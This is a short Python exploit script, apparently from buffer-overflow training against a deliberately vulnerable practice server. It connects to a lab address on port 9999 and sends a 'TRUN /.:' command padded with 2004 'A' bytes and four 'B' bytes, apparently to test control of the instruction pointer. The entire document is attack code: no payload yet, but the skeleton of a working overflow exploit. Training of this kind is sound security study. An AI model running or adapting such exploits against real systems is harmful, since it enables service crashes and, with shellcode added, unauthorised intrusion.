#!/usr/bin/python
import sys, socket
from time import sleep

shellcode = "A" * 2004 + "B" * 4

try:
	payload = "TRUN /.:" + shellcode
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.2.4', 9999))
	
	s.send(payload.encode())
	s.close()
except:
	print("Error connecting to server")
	sys.exit()
